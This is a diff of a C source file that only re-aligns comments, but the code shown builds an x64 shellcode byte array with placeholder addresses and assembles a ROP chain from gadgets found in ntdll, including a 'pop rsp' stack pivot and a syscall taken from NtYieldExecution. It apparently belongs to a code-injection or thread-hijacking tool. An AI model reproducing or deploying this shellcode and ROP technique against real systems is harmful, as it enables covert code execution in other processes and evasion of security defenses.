@@ -135,19 +135,19 @@ void CreatePayload(THREAD_DATA* threadData) {
 
 	BYTE payload[] = {
 		/*0: */			0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,	// movabs  rax, 0x1111111111111111
-		/*a: */			0x50,														// push rax
-		/*b: */			0x49, 0x89, 0xe0, 											// mov r8, rsp
+		/*a: */			0x50,								// push rax
+		/*b: */			0x49, 0x89, 0xe0, 						// mov r8, rsp
 		/*e: */			0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,	// movabs  rax, 0x2222222222222222
-		/*19: */		0x50,														// push rax
-		/*1a: */		0x48, 0x89, 0xe2, 											// mov rdx, rsp
-		/*1d: */		0x48, 0x31, 0xC9,											// xor rcx, rcx
-		/*20: */		0x4D, 0x31, 0xC9,											// xor r9, r9
-		/*23: */		0x48, 0x83, 0xEC, 0x28,										// sub rsp, 0x28
+		/*19: */		0x50,								// push rax
+		/*1a: */		0x48, 0x89, 0xe2, 						// mov rdx, rsp
+		/*1d: */		0x48, 0x31, 0xC9,						// xor rcx, rcx
+		/*20: */		0x4D, 0x31, 0xC9,						// xor r9, r9
+		/*23: */		0x48, 0x83, 0xEC, 0x28,						// sub rsp, 0x28
 		/*27: */		0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,	// movabs  rax, 0x3333333333333333
-		/*31: */		0xFF, 0xD0,													// call rax
-		/*33: */		0x48, 0x83, 0xC4, 0x38,										// add rsp, 0x38
-		/*37: */		0x48, 0x31, 0xc0,											// xor rax, rax
-		/*3a: */		0xC3,														// ret
+		/*31: */		0xFF, 0xD0,							// call rax
+		/*33: */		0x48, 0x83, 0xC4, 0x38,						// add rsp, 0x38
+		/*37: */		0x48, 0x31, 0xc0,						// xor rax, rax
+		/*3a: */		0xC3,								// ret
 		 };
 
 
@@ -198,22 +198,22 @@ VOID CreateROP(THREAD_DATA* threadData) {
 	DWORD count = 0;
 	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
 	DWORD64 popregs = SearchRopGadgets("\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 12); /*	0:  58                  pop    rax
-																								1:  5a                      pop    rdx
-																								2:  59                      pop    rcx
-																								3:  41 58                   pop    r8
-																								5:  41 59                   pop    r9
-																								7:  41 5a                   pop    r10
-																								9:  41 5b                   pop    r11
-																								10: c3						ret	*/
+													1:  5a                  pop    rdx
+													2:  59                  pop    rcx
+													3:  41 58               pop    r8
+													5:  41 59               pop    r9
+													7:  41 5a               pop    r10
+													9:  41 5b               pop    r11
+													10: c3			ret	*/
 	DWORD64 syscall = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "NtYieldExecution") + 0x12;
 
-	DWORD64 pivotGadget = SearchRopGadgets("\x5C\xC3", 2); /*	0: 5c				pop rsp
-																1: c3				ret*/
+	DWORD64 pivotGadget = SearchRopGadgets("\x5C\xC3", 2); /*	0: 5c	pop rsp
+									1: c3	ret*/
 
 	DWORD64 add28 = SearchRopGadgets("\x48\x83\xC4\x28\xC3", 5); /*	0: add rsp, 0x28
-																	1: ret*/
+									1: ret*/
 	DWORD64 add58 = SearchRopGadgets("\x48\x83\xC4\x58\xC3", 5); /*	0: add rsp, 0x58
-																	1: ret*/
+									1: ret*/
 
 	DWORD64 ret = SearchRopGadgets("\xC3", 1);
 
